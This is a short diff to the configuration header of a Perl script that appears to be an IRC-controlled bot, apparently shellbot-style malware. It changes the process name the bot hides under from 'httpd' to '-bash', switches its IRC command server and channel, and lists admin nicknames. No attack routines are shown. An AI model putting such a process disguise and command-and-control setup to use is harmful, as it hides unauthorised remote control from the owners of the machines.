@@ -1,8 +1,8 @@
 #!/usr/bin/perl
-my $processo = 'httpd';
-$servidor='irc.prison.net' unless $servidor;
+my $processo = '-bash';
+$servidor='irc.efnet.org' unless $servidor;
 my $porta='6667';
-my @canais=("#/dev/random random!#");
+my @canais=("#/dev/random");
 my @adms=("del","spy","lol","andi-","izpi");
 
 my $linas_max=6;
